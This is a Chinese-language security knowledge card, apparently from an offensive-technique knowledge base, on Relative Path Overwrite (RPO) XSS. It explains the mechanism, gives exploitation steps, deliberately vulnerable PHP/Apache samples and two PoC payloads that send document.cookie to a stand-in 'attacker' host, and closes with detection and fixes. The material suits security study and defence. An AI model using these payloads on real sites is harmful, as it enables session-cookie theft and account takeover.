---
id: web-generic-xss-rpo-relative-path-overwrite
title: RPO 相对路径覆盖：URL 重写把服务端 HTML 当 JS 加载，绕过客户端过滤执行注入代码
type: scenario
domain: web
path: web/generic/xss
technique: relative-path-overwrite-script-context
aliases:
- RPO
- Relative Path Overwrite
- 相对路径覆盖
- 路径解析差异 XSS
- RPO XSS
- filter.js 绕过
tags:
- web
- xss
- rpo
- relative-path-overwrite
- url-rewrite
- mime-sniffing
- client-side-filter-bypass
- path-info
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V302
  verified_at: '2026-11-08T12:14:29+08:00'
  notes: 已对照原文 content.md 与 7 张图片核对：img01 filter.js 黑名单；img02 vuln.php 相对引用 filter.js 且 param 进 innerHTML；img03/04 /index.php/filter.js 与端口路径的相对解析；img05 static/filter.js；img06 404 页回显 /index.php/;alert(1)//filter.js not found. 并 200；Demo1 innerHTML 绕过与 Demo2 RewriteRule+404 回显 URI 均按原文复述。两 Demo 为同一 RPO 技术原子的触发变体，合并一卡合理，粒度合格；dedup 除自身外仅 related（双重解码 setTimeout、路径段反射 SVG），机制不同并列保留。未验证点：未搭环境复测，nosniff/相对路径等条件依赖目标配置。
---

## 一句话结论

站点启用 URL 重写、页面又用相对路径引用 JS/CSS 时，访问 `/index.php/<任意后缀>` 会让浏览器把 `/index.php/` 当成目录，把 `src="filter.js"` 解析成 `/index.php/filter.js`；服务器经重写仍返回 `index.php` 的 HTML，而浏览器在 script 上下文按 JavaScript 解析这段 HTML，导致页面中可控内容被当代码执行，同时原本用于过滤的 `filter.js` 根本不会加载，客户端黑名单形同虚设。

## 原理

- **服务端解析**：URL 重写（Apache `RewriteRule`、PHP PATH_INFO、框架前缀路由等）把 `/index.php/1234` 整体交给 `index.php` 处理，多余路径段被当作参数或 PATH_INFO，服务端认为资源仍是 `index.php`。
- **浏览器解析**：浏览器不知道服务端的重写规则，只按 URL 做 RFC 3986 相对路径解析。`/index.php/1234` 的当前目录是 `/index.php/`，页面里的相对引用 `src="filter.js"` 被解析为 `/index.php/filter.js`；带尾斜杠的 `/index.php/` 同样把 `/index.php/` 当目录。
- **上下文错配**：浏览器对 `<script src>` 的响应按脚本处理；在缺少 `X-Content-Type-Options: nosniff` 时，即使响应是 `text/html`，浏览器仍会尝试作为 JS 执行（控制台通常只给 MIME 警告）。于是服务端返回的整页 HTML 进入 JS 解析器：HTML 标签部分报语法错误，但其中可被构造成合法 JS 的片段（可控参数、404 页回显的请求 URI 等）会执行。
- **过滤失效**：正常访问 `vuln.php` 时 `filter.js` 成功加载，`var filter = ["script","on","frame","object"]` 生效；访问 `vuln.php/` 时 `filter.js` 被解析到 `vuln.php/filter.js`，服务器返回的是 `vuln.php` 的 HTML 而不是 `filter.js`，`filter` 变量未定义，`typeof filter !== 'undefined'` 判断为假，过滤循环整体跳过，后面的 `innerHTML` sink 直接接收原始参数。
- **CSS 同理**：`<link rel="stylesheet" href="style.css">` 在 `/index.php/tmp/` 下被解析为 `/index.php/tmp/style.css`；服务器返回 HTML，CSS 解析器按容错规则跳过非法片段、保留可识别的规则，形成 CSS 注入（可配合 `@import`、属性选择器做外带）。

## 触发条件

- 服务端启用 URL 重写/PATH_INFO，`/入口文件/任意后缀` 仍返回同一个 HTML 页面。
- 页面使用相对路径引用 JS 或 CSS（`src="filter.js"`、`href="style.css"`，而不是 `/static/filter.js`）。
- 响应没有 `X-Content-Type-Options: nosniff`，浏览器愿意把 `text/html` 响应当脚本/样式解析。
- 页面存在可控输出点可拼进被当作 JS/CSS 的响应（反射参数、404 页回显 URI、存储内容等）。
- 攻击者能让受害者访问带尾斜杠和后缀的构造 URL（反射型需诱导点击，配合 bot 时可直接提交）。

## 利用步骤

1. 确认重写行为：访问 `/index.php/`、`/index.php/anything`，对比是否都返回同一页面；查看页面源码里的资源引用是否相对路径。
2. 确认相对解析结果：打开开发者工具 Network，访问 `/index.php/`，观察 `filter.js` 的请求是否变成 `/index.php/filter.js`，以及响应体是否为 HTML。
3. 确认上下文执行：在可控参数/路径中放入一段合法 JS（如 `;alert(1)//`），观察是否在 script 上下文执行；若响应前有 `/index.php/` 等前缀，利用 `/` 起始可被解析为正则字面量的特性，把前缀吞成 `/index.php/;` 表达式。
4. 构造完整 payload：在 `innerHTML` 等 sink 处用无 `<script>` 的标签事件执行，或用 404 页回显 URI 直接把 payload 写进被当 JS 加载的响应。
5. 验证危害：读取 `document.cookie`、发起同源请求或外带页面数据到攻击者服务器。

## PoC

Demo 1：相对引用导致过滤脚本不加载，DOM XSS 绕过黑名单。

```html
<!-- filter.js：正常加载时生效的黑名单 -->
<script>var filter = ["script", "on", "frame", "object"];</script>
```

```php
<!-- vuln.php：相对路径引用 filter.js，并把 param 写入 innerHTML -->
<script src="filter.js"></script>
<pre id=param></pre>
<script>
  var param_elem = document.getElementById("param");
  var url = new URL(window.location.href);
  var param = url.searchParams.get("param");
  if (typeof filter !== 'undefined') {
    for (var i = 0; i < filter.length; i++) {
      if (param.toLowerCase().includes(filter[i])) { param = "nope !!"; break; }
    }
  }
  param_elem.innerHTML = param;
</script>
```

```text
# 访问 /vuln.php/ 时 filter.js 被解析到 /vuln.php/filter.js，返回的是 vuln.php 的 HTML，
# filter 未定义，过滤被跳过；payload（URL 中 + 需编码为 %2b）：
http://target/vuln.php/?param=<img src=@ onerror=location.href="https://attacker/?"%2bdocument.cookie>
```

Demo 2：重写规则 + 404 页回显 `REQUEST_URI`，把路径 payload 当 JS 执行。

```apache
RewriteEngine on
RewriteRule ^/(.*)\.(js|css)$ /static/$1 [L]
ErrorDocument 404 /404.php
```

```php
<?php
    header("HTTP/1.1 200 OK");
    echo $_SERVER["REQUEST_URI"] . " not found.";
?>
```

```text
# 页面相对引用 filter.js；访问带 payload 的路径后，浏览器请求
#   /index.php/;location.href='https://attacker/'%2bdocument.cookie;//filter.js
# 命中重写规则转到 /static/...（不存在）→ 404.php 回显请求 URI，被当 JS 加载：
#   /index.php/;location.href='https://attacker/'+document.cookie;//filter.js not found.
# 开头的 /index.php/ 被解析为正则字面量表达式，分号后执行赋值，// 注释掉尾部内容。
http://target/index.php/;location.href='https://attacker/'%2bdocument.cookie;//
```

## 变体与关联

- 变体：Demo 2 的 404 `ErrorDocument` 回显 `REQUEST_URI`，把“路径本身”变成 JS 源，不依赖页面反射点。
- 变体：`index.php/` 前缀在 JS 中天然构成 `/index.php/` 正则字面量，payload 前加 `;` 即可把前缀变成合法表达式；响应尾部用 `//` 注释。
- 变体：CSS 上下文同样成立，利用 CSS 容错解析注入 `@import` 或属性选择器，配合 `[[web-generic-xs-leaks-css-attribute-selector-exfil]]` 做数据外带。
- 关联：`[[web-generic-csrf-rpo-css-selector-side-channel]]` 用 RPO 把 HTML 当 CSS 解析并逐字符枚举 token，是本卡 CSS 方向的具体链。
- 关联：`[[web-generic-xss-beautifulsoup-findall-parser-differential-bypass]]` 同属“服务端/浏览器解析差异”类绕过，思路一致。
- 边界：页面资源用绝对路径或 `<base href>` 固定基址时，相对解析被钉死，RPO 不成立；响应带 `nosniff` 或严格 MIME 校验时脚本/样式可能被拒绝执行；仅返回 JSON/纯文本且无可构造片段时只能造成解析错误。

## 检测与防御

- 检测：访问日志中出现 `/入口文件/<异常后缀>`、`/入口文件/;...//` 形式的 URL；页面同时出现相对资源引用与用户可控输出；404 页回显 `REQUEST_URI` 且状态码被改为 200。
- 修复（写法）：资源引用改为以 `/` 开头的绝对路径，或加 `<base href="/">` 固定基址，使浏览器解析结果与服务端路由无关。
- 修复（响应）：对所有 HTML 响应设置正确的 `Content-Type` 与 `X-Content-Type-Options: nosniff`，禁止浏览器把 HTML 当 JS/CSS 执行。
- 修复（路由）：对 PATH_INFO/多余路径段做规范化与白名单，`/index.php/任意后缀` 不应静默命中同一页面；关闭不必要的 URL 重写。
- 加固：不要用客户端 JS 黑名单作为唯一防线，危险 sink（`innerHTML`）应做上下文编码；404 页禁止回显原始 `REQUEST_URI`。
